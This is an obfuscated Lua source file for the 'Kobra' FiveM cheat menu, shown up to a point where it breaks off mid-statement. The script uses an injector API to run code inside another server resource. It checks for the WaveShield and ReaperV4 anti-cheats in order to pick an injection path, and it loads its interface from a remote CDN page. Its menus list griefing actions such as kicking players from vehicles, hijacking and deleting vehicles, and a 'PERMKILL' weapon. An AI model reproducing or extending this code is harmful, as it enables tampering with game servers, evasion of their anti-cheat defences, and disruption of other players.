-MachoLockLogger(1);local v0={};local v1=false;local v2=nil;local v3=2 -1 ;local v4={};local v5=v4;local v6=nil;local v7=1;local v8={};local v9={};local v10=nil;local v11="H";local v12=false;local v13={};local v14=false;local v15={};local v16={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v17=false;local v18=false;local v19=false;local v20=false;local v21=nil;local v22=2 -1 ;local v23=1 + 0 ;local v24={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v25={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v26={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v27=1;local v28=false;local v29=false;local v30=false;local v31=false;local v32={[27]="Escape",[112]="F1",[173 -60 ]="F2",[458 -344 ]="F3",[466 -(285 + 66) ]="F4",[270 -154 ]="F5",[1427 -(682 + 628) ]="F6",[118]="F7",[20 + 99 ]="F8",[419 -(176 + 123) ]="F9",[51 + 70 ]="F10",[122]="F11",[90 + 33 ]="F12",[461 -(239 + 30) ]="`",[49]="1",[14 + 36 ]="2",[51]="3",[50 + 2 ]="4",[53]="5",[54]="6",[96 -41 ]="7",[56]="8",[177 -120 ]="9",[363 -(306 + 9) ]="0",[659 -470 ]="-",[187]="=",[2 + 6 ]="Backspace",[6 + 3 ]="Tab",[39 + 42 ]="Q",[248 -161 ]="W",[1444 -(1140 + 235) ]="E",[53 + 29 ]="R",[78 + 6 ]="T",[23 + 66 ]="Y",[137 -(33 + 19) ]="U",[27 + 46 ]="I",[236 -157 ]="O",[80]="P",[219]="[",[98 + 123 ]="]",[431 -211 ]="\\",[20]="CapsLock",[65]="A",[83]="S",[64 + 4 ]="D",[70]="F",[71]="G",[761 -(586 + 103) ]="H",[7 + 67 ]="J",[230 -155 ]="K",[76]="L",[1674 -(1309 + 179) ]=";",[222]="'",[13]="Enter",[16]="Shift",[162 -72 ]="Z",[39 + 49 ]="X",[67]="C",[230 -144 ]="V",[50 + 16 ]="B",[165 -87 ]="N",[153 -76 ]="M",[797 -(295 + 314) ]=",",[190]=".",[469 -278 ]="/",[1979 -(1300 + 662) ]="Control",[144 -98 ]="Delete",[1788 -(1178 + 577) ]="PageUp",[34]="PageDown",[19 + 16 ]="End",[106 -70 ]="Home",[38]="ArrowUp",[1445 -(851 + 554) ]="ArrowDown",[37]="ArrowLeft",[35 + 4 ]="ArrowRight"};local v33={[74 -47 ]=698 -376 ,[112]=590 -(115 + 187) ,[113]=222 + 67 ,[108 + 6 ]=669 -499 ,[1276 -(160 + 1001) ]=167,[116]=166,[117]=147 + 20 ,[118]=116 + 52 ,[243 -124 ]=527 -(237 + 121) ,[1017 -(525 + 372) ]=56,[229 -108 ]=186 -129 ,[122]=486 -(96 + 46) ,[900 -(643 + 134) ]=345,[70 + 122 ]=243,[117 -68 ]=157,[185 -135 ]=158,[49 + 2 ]=314 -154 ,[52]=334 -170 ,[53]=165,[54]=159,[774 -(316 + 403) ]=108 + 53 ,[153 -97 ]=59 + 103 ,[57]=410 -247 ,[35 + 13 ]=27 + 55 ,[654 -465 ]=84,[893 -706 ]=172 -89 ,[1 + 7 ]=177,[17 -8 ]=2 + 35 ,[238 -157 ]=61 -(12 + 5) ,[87]=124 -92 ,[146 -77 ]=97 -51 ,[82]=45,[84]=245,[89]=246,[210 -125 ]=303,[15 + 58 ]=2047 -(1656 + 317) ,[71 + 8 ]=160 + 39 ,[212 -132 ]=7,[219]=39,[221]=196 -156 ,[220]=36,[374 -(5 + 349) ]=650 -513 ,[1336 -(266 + 1005) ]=34,[83]=33,[45 + 23 ]=102 -72 ,[92 -22 ]=1745 -(561 + 1135) ,[71]=61 -14 ,[236 -164 ]=74,[1140 -(507 + 559) ]=311,[75]=311,[190 -114 ]=21 -14 ,[574 -(212 + 176) ]=81,[1127 -(250 + 655) ]=223 -141 ,[22 -9 ]=27 -9 ,[1972 -(1869 + 87) ]=21,[90]=20,[305 -217 ]=1974 -(484 + 1417) ,[67]=55 -29 ,[143 -57 ]=773 -(48 + 725) ,[107 -41 ]=77 -48 ,[46 + 32 ]=665 -416 ,[77]=244,[53 + 135 ]=82,[56 + 134 ]=934 -(152 + 701) ,[1502 -(430 + 881) ]=32 + 51 ,[912 -(557 + 338) ]=11 + 25 ,[129 -83 ]=623 -445 ,[87 -54 ]=10,[34]=23 -12 ,[836 -(499 + 302) ]=1079 -(39 + 827) ,[98 -62 ]=475 -262 ,[150 -112 ]=27,[61 -21 ]=15 + 158 ,[108 -71 ]=174,[7 + 32 ]=175};local v34={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v35=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v36=((v35=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;v0.Debug=function(v106,v107,v108) local v109=0 -0 ;local v110;local v111;while true do if ((104 -(103 + 1))==v109) then v110={red="^1",yellow="^3",green="^2",info="^5"};v111=v110[v107] or "^5" ;v109=555 -(475 + 79) ;end if (v109==(2 -1)) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v111,v108));break;end end end;v0.SendMessage=function(v112,v113) if (v2 and v113) then MachoSendDuiMessage(v2,json.encode(v113));end end;v0.Notify=function(v114,v115,v116,v117,v118) v114:SendMessage({action="showNotification",type=v115,title=v116,desc=v117,duration=v118});end;v0.GetMenuPath=function(v119) local v120={"Kobra"};for v297=1 + 0 , #v9 do table.insert(v120,v9[v297]);end return v120;end;v0.UpdateElements=function(v121,v122) local v123=0;local v124;while true do if (v123==(1 + 0)) then if (v6 and (type(v6)=="table") and ( #v6>(1503 -(1395 + 108)))) then v124.categories=v6;v124.categoryIndex=(v7 or (2 -1)) -(1205 -(7 + 1197)) ;end v121:SendMessage(v124);break;end if (v123==(0 + 0)) then if ( not v122 or (type(v122)~="table")) then return;end v124={action="updateElements",elements=v122,index=v3-1 ,path=v121:GetMenuPath()};v123=1 + 0 ;end end end;v0.Initialize=function(v125) local v126=0;local v127;while true do if (v126==(319 -(27 + 292))) then v127="https://rawcdn.githack.com/WM5M/kobra-ui2/2daf6469485a4753166d641be83ff88e318ca6b1/index.html";v2=MachoCreateDui(v127);v126=2 -1 ;end if (v126==(1 -0)) then if v2 then v125:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v2);v125:Debug("green","Kobra UI loaded successfully!");else v125:Debug("red","Failed to load Kobra UI!");end break;end end end;v0.HideUI=function(v128,v129) local v130=0;while true do if (v130==0) then if v129 then v10={currentMenu=v5,hoveredIndex=v3,menuStack=v8,menuLabelStack=v9,currentCategories=v6,currentCategoryIndex=v7};else v10=nil;end v1=false;v130=4 -3 ;end if (v130==(1 -0)) then v128:SendMessage({action="keydown",index=0 -0 });v128:SendMessage({action="showUI",visible=false,index=139 -(43 + 96) });break;end end end;v0.SendMessage=function(v131,v132) local v133=0 -0 ;while true do if (v133==0) then if ( not v2 or  not v132 or (type(v132)~="table")) then return;end MachoSendDuiMessage(v2,json.encode(v132));break;end end end;v0.ShowUI=function(v134) local v135=0;local v136;while true do if (v135==(0 -0)) then v1=true;v136={action="showUI",visible=true,elements=v5,index=v3-1 ,path=v134:GetMenuPath(),username=Username or "KobraBypass" ,header="KOBRA MENU",theme="kobra-red-black"};v135=1 + 0 ;end if (v135==(1 + 0)) then if (v6 and ( #v6>(0 -0))) then local v703=0 + 0 ;while true do if (v703==(0 -0)) then v136.categories=v6;v136.categoryIndex=v7-1 ;break;end end end v134:SendMessage(v136);break;end end end;v0.UpdateElements=function(v137,v138) local v139=0 + 0 ;local v140;while true do if (v139==(1 + 0)) then if (v6 and ( #v6>(1751 -(1414 + 337)))) then local v704=1940 -(1642 + 298) ;while true do if (v704==(0 -0)) then v140.categories=v6;v140.categoryIndex=(v7 or (2 -1)) -(2 -1) ;break;end end end v137:SendMessage(v140);break;end if (v139==0) then if ( not v138 or (type(v138)~="table")) then return;end v140={action="updateElements",elements=v138,index=v3-(1 + 0) ,path=v137:GetMenuPath(),header="KOBRA MENU"};v139=1;end end end;v0.IsShiftHeld=function(v141) return v14;end;MachoOnKeyDown(function(v142) if ((v142==(13 + 3)) or (v142==(1132 -(357 + 615))) or (v142==(114 + 47))) then v14=true;end end);MachoOnKeyUp(function(v143) if ((v143==(38 -22)) or (v143==(138 + 22)) or (v143==161)) then v14=false;end end);local v46=nil;local function v47(v144,v145,v146,v147) local v148=0 -0 ;while true do if (v148==(3 + 0)) then v12=false;break;end if (v148==1) then MachoSendDuiMessage(v2,json.encode({action="updateKeyboard",visible=true,title=v144,value=v46.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v148=1 + 1 ;end if (v148==2) then Wait(158 + 92 );v0:HideUI(true);v148=3;end if (v148==0) then if v46 then return;end v46={title=v144,buffer=v145 or "" ,maxLength=32,onConfirm=v146,type=v147 or "typeable" ,closeable=((v147=="keybind") and false) or true ,active=true};v148=1;end end end MachoOnKeyDown(function(v149) if ( not v46 or  not v46.active) then return;end if (v149==13) then local v473=1301 -(384 + 917) ;while true do if (v473==(698 -(128 + 569))) then if v46.onConfirm then v46.onConfirm(v46.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v473=1545 -(1407 + 136) ;end if ((1887 -(687 + 1200))==v473) then v46.active=false;MachoSendDuiMessage(v2,json.encode({action="updateKeyboard",visible=false}));v473=1711 -(556 + 1154) ;end if (v473==(6 -4)) then v46=nil;v12=true;v473=98 -(9 + 86) ;end if (v473==(424 -(275 + 146))) then return;end end elseif (v149==8) then if (v46.type=="typeable") then v46.buffer=v46.buffer:sub(1, -(1 + 1));else v46.buffer="";end elseif (v149==(91 -(29 + 35))) then local v787=0 -0 ;while true do if (v787==(0 -0)) then if  not v46.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v787=1;end if ((4 -3)==v787) then v46.active=false;MachoSendDuiMessage(v2,json.encode({action="updateKeyboard",visible=false}));v787=2 + 0 ;end if (v787==2) then v46=nil;v12=true;v787=1015 -(53 + 959) ;end if (v787==(411 -(312 + 96))) then return;end end elseif (v46.type=="keybind") then local v883=0;local v884;while true do if (v883==(0 -0)) then v884=v32[v149];if v884 then if (v46.buffer~=v884) then v46.buffer=v884;end end break;end end elseif (v46.type=="typeable") then local v1009=285 -(147 + 138) ;local v1010;local v1011;while true do if (v1009==(899 -(813 + 86))) then v1010={[44 + 4 ]="0",[90 -41 ]="1",[542 -(18 + 474) ]="2",[18 + 33 ]="3",[169 -117 ]="4",[53]="5",[1140 -(860 + 226) ]="6",[55]="7",[359 -(121 + 182) ]="8",[57]="9",[9 + 56 ]="A",[1306 -(988 + 252) ]="B",[8 + 59 ]="C",[22 + 46 ]="D",[2039 -(49 + 1921) ]="E",[70]="F",[961 -(223 + 667) ]="G",[124 -(51 + 1) ]="H",[125 -52 ]="I",[74]="J",[160 -85 ]="K",[1201 -(146 + 979) ]="L",[22 + 55 ]="M",[78]="N",[684 -(311 + 294) ]="O",[80]="P",[225 -144 ]="Q",[35 + 47 ]="R",[83]="S",[1527 -(496 + 947) ]="T",[85]="U",[86]="V",[87]="W",[88]="X",[89]="Y",[1448 -(1233 + 125) ]="Z",[77 + 112 ]="-",[187]="=",[169 + 19 ]=",",[190]=".",[36 + 150 ]=";",[1867 -(963 + 682) ]="'",[191]="/",[161 + 31 ]="`",[32]=" "};v1011=v1010[v149];v1009=1;end if (v1009==(1505 -(504 + 1000))) then if (v1011 and ( #v46.buffer<v46.maxLength)) then local v1309=0 + 0 ;while true do if (v1309==(0 + 0)) then if v0:IsShiftHeld() then if v1011:match("%a") then v1011=v1011:upper();elseif (v1011=="-") then v1011="_";end elseif v1011:match("%a") then v1011=v1011:lower();end v46.buffer=v46.buffer   .. v1011 ;break;end end end break;end end end if v46 then MachoSendDuiMessage(v2,json.encode({action="updateKeyboard",visible=true,title=v46.title,value=v46.buffer}));end end);CreateThread(function() while true do local v298=0 + 0 ;while true do if (v298==0) then Wait(0 -0 );if (v46~=nil) then local v788=0 + 0 ;while true do if (v788==(0 + 0)) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v788=183 -(156 + 26) ;end if (v788==1) then for v1012=0,206 + 151  do if ((v1012<48) or (v1012>(140 -50))) then DisableControlAction(164 -(149 + 15) ,v1012,true);end end break;end end else Wait(500);end break;end end end end);v0.ScrollOne=function(v150,v151) if ( not v151 or ( #v5==(960 -(890 + 70)))) then return;end local v152=117 -(39 + 78) ;repeat if (v151=="Up") then local v534=482 -(14 + 468) ;while true do if (v534==0) then v3=v3-(2 -1) ;if (v3<(2 -1)) then v3= #v5;end break;end end elseif (v151=="Down") then local v706=0;while true do if (v706==(0 + 0)) then v3=v3 + 1 ;if (v3> #v5) then v3=1;end break;end end end v152=v152 + 1 ;if (v152>200) then break;end until v5[v3] and (v5[v3].type~="divider")  if v2 then v150:SendMessage({action="keydown",index=v3-(1 + 0) });end end;v0.ScrollTwo=function(v153,v154) local v155=0;local v156;while true do if (v155==(1 + 0)) then if (((v156.type=="scrollable") or (v156.type=="scrollable-checkbox")) and v156.values and ( #v156.values>0)) then local v707=0 + 0 ;while true do if (v707==(1 + 0)) then v153:UpdateElements(v5);if ((v156.scrollType=="onScroll") and v156.onSelect) then if (v156.type=="scrollable-checkbox") then v156.onSelect(v156.values[v156.value],v156.checked or false );else v156.onSelect(v156.values[v156.value]);end end break;end if (v707==(0 -0)) then v156.value=v156.value or (1 + 0) ;if (v154=="Left") then local v1013=0 -0 ;while true do if (v1013==(0 + 0)) then v156.value=v156.value-1 ;if (v156.value<(52 -(12 + 39))) then v156.value= #v156.values;end break;end end elseif (v154=="Right") then v156.value=v156.value + 1 + 0 ;if (v156.value> #v156.values) then v156.value=1;end end v707=1;end end elseif ((v156.type=="slider") or (v156.type=="slider-checkbox")) then v156.value=v156.value or v156.min or (0 -0) ;local v821=v156.step or (3 -2) ;if (v154=="Left") then v156.value=math.max(v156.min or (0 + 0) ,v156.value-v821 );elseif (v154=="Right") then v156.value=math.min(v156.max or (53 + 47) ,v156.value + v821 );end for v886,v887 in pairs(v13) do if ((v887.type=="slider-checkbox") and (type(v887.value)~="nil") and (v887.label==v156.label)) then if (v154=="Left") then v887.value=math.max(v156.min or (0 -0) ,v156.value-v821 );elseif (v154=="Right") then v887.value=math.min(v156.max or (67 + 33) ,v156.value + v821 );else return;end end end v153:UpdateElements(v5);if ((v156.scrollType=="onScroll") and v156.onSelect) then if (v156.type=="slider-checkbox") then v156.onSelect(v156.value,v156.checked or false );else v156.onSelect(v156.value);end end end break;end if (v155==(0 -0)) then v156=v5[v3];if  not v156 then return;end v155=1711 -(1596 + 114) ;end end end;v0.Enter=function(v157) if ( not v5 or ( #v5==(0 -0))) then return;end local v158=v5[v3];if  not v158 then return;end if  not v12 then return;end if (v158.type=="subMenu") then local v474=713 -(164 + 549) ;while true do if (v474==2) then if (v158.subTabs and (type(v158.subTabs)=="table") and ( #v158.subTabs>(1438 -(1059 + 379)))) then v6=nil;v7=1 -0 ;v5=v158.subTabs;v3=1 + 0 ;v157:UpdateElements(v5);return;end return;end if ((1 + 0)==v474) then if (v158.type=="Server") then v0:UpdateListMenu();end if (v158.categories and (type(v158.categories)=="table") and ( #v158.categories>(392 -(145 + 247)))) then v6=v158.categories;v7=1 + 0 ;v5=v6[v7].tabs or {} ;v3=1;v157:UpdateElements(v5);return;end v474=1 + 1 ;end if (v474==(0 -0)) then table.insert(v8,{menu=v5,categories=v6,categoryIndex=v7});table.insert(v9,v158.label or "Submenu" );v474=1 + 0 ;end end end if ((v158.type=="button") and v158.onSelect and (type(v158.onSelect)=="function")) then local v475=0 + 0 ;local v476;local v477;while true do if (v475==(0 -0)) then v476,v477=pcall(v158.onSelect);if  not v476 then v157:Debug("red","onSelect error: "   .. tostring(v477) );end v475=721 -(254 + 466) ;end if ((561 -(544 + 16))==v475) then return;end end end if ((v158.type=="checkbox") or (v158.type=="scrollable-checkbox") or (v158.type=="slider-checkbox")) then local v478=0 -0 ;while true do if (v478==0) then if v158.locked then local v824=628 -(294 + 334) ;while true do if (v824==(253 -(236 + 17))) then v157:Notify("error","Kobra","This module has been disabled due to high detection rates!",3000);return;end end end if (type(v158.checked)~="boolean") then v158.checked=true;else v158.checked= not v158.checked;end v478=1;end if (v478==(1 + 0)) then if (v158.onSelect and (type(v158.onSelect)=="function")) then if (v158.type=="scrollable-checkbox") then local v984=0 + 0 ;local v985;local v986;while true do if ((0 -0)==v984) then v985,v986=pcall(v158.onSelect,v158.values[v158.value],v158.checked);if  not v985 then v157:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v986) );end break;end end elseif (v158.type=="slider-checkbox") then local v1072=0 -0 ;local v1073;local v1074;while true do if (v1072==0) then v1073,v1074=pcall(v158.onSelect,v158.value,v158.checked);if  not v1073 then v157:Debug("red","slider-checkbox onSelect error: "   .. tostring(v1074) );end break;end end else local v1075=0;local v1076;local v1077;while true do if (v1075==0) then v1076,v1077=pcall(v158.onSelect,v158.checked);if  not v1076 then v157:Debug("red","checkbox onSelect error: "   .. tostring(v1077) );end break;end end end end v157:UpdateElements(v5);v478=2 + 0 ;end if (v478==(2 + 0)) then return;end end end if 